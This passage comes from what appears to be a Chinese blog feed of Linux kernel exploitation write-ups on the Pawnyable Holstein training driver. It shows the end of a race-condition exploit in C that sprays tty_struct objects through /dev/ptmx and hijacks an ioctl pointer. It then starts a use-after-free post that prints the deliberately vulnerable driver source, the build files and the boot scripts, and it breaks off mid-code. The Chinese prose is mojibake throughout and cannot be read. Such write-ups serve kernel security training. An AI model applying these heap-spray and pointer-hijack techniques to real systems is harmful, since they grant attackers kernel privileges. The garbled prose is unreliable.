punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bss 0xffffffffc00023c0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tty_fd2<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/ptmx Opened\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">read</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0x5401</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"UAF#2 spray Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token comment">//ops_ioctl</span><span class="token function">write</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>tty_fd2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> heap<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/cb9f333413946c5aa7aa3fad9c74fff7_MD5.jpeg"></p><h1 id="äºŒã€æ‚è°ˆ"><a href="#äºŒã€æ‚è°ˆ" class="headerlink" title="äºŒã€æ‚è°ˆ"></a>äºŒã€æ‚è°ˆ</h1><p>æ¡ä»¶ç«äº‰çš„æ¼æ´åˆ©ç”¨å¾ˆéš¾è°ƒè¯•ï¼Œå› æ­¤åˆ©ç”¨çš„å…³é”®æ­¥éª¤æ˜¯èƒ½å¦ç¨³å®šåœ°è§¦å‘ç«äº‰ã€‚</p><p>æˆ‘è‡ªå·±ä¹¦å†™çš„EXPå¹¶ä¸ç¨³å®šï¼Œå®¹æ˜“å‡ºç°â€œå¡æ­»â€çš„ç°è±¡ï¼Œåœ¨è°ƒè¯•å’Œåˆ©ç”¨æ—¶éå¸¸ä¸æ–¹ä¾¿ï¼›ç›¸åï¼ŒåŸä½œè€…çš„EXPå°±æ˜¾å¾—ç¨³å®šè®¸å¤šï¼Œä»¥ä¸‹æ˜¯åŸä½œè€…çš„ç«äº‰çº¿ç¨‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>cpu_set <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">gettid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cpu_set<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"sched_setaffinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>race_win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> fd2<span class="token punctuation">)</span> race_win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>race_win <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fd <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>      race_win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] race win!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>åˆ°æ­¤ï¼ŒLK1çš„ç»ƒä¹ æ­£å¼ç»“æŸã€‚ä»è¿™é‡Œå¼€å§‹æˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨ç‰¹å®šäºå†…æ ¸ç©ºé—´çš„æ”»å‡»æ–¹æ³•ç­‰è¯¦ç»†å†…å®¹ã€‚</p><blockquote><p>é™„ä»¶ï¼š<a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-4.tar.gz">LK01-4.tar.gz</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.wohin.me/posts/pawnyable-0204/">Linux Kernel PWN | 040204 Pawnyableä¹‹ç«æ€æ¡ä»¶ (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK01/race_condition.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">Holstein v4ï¼šç«èµ›æ¡ä»¶ | å¯å…¸å½“ï¼ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK01-3 Holstein v3 UAF</title>
      <link href="/2024/02/04/LK01-3%20Holstein%20v3%20UAF/"/>
      <url>/2024/02/04/LK01-3%20Holstein%20v3%20UAF/</url>
      
        <content type="html"><![CDATA[<p>LKMæºç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Holstein v3 - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"holstein"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token keyword">char</span> <span class="token operator">*</span>g_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_open called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"kmalloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                           <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                           <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_read called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"invalid buffer size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_to_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                            <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                            <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_write called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"invalid buffer size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_from_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_close called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span>  <span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>   <span class="token punctuation">.</span>read    <span class="token operator">=</span> module_read<span class="token punctuation">,</span>   <span class="token punctuation">.</span>write   <span class="token operator">=</span> module_write<span class="token punctuation">,</span>   <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>   <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to register device\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to add cdev\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefileï¼š</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> vuln.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/buildCFLAGS_vuln.o <span class="token operator">:=</span> -O1<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.16.14çš„å†…æ ¸</p><h1 id="ä¸€ã€LK01-3-Holstein-v3"><a href="#ä¸€ã€LK01-3-Holstein-v3" class="headerlink" title="ä¸€ã€LK01-3 Holstein v3"></a>ä¸€ã€LK01-3 Holstein v3</h1><h2 id="ä¸€-ç¨‹åºåˆ†æ"><a href="#ä¸€-ç¨‹åºåˆ†æ" class="headerlink" title="(ä¸€)ç¨‹åºåˆ†æ"></a>(ä¸€)ç¨‹åºåˆ†æ</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictinsmod /root/vuln.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/holstein c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> holstein /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Holstein v3 (KL01-3) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> qemu64,+smap,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">1</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€å¯äº†smepã€smapã€kaslrã€kpti</p><h3 id="vuln-ko"><a href="#vuln-ko" class="headerlink" title="vuln.ko"></a>vuln.ko</h3><h4 id="module-initialize"><a href="#module-initialize" class="headerlink" title="module_initialize"></a>module_initialize</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"holstein"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2B3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    qword_7E0 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token 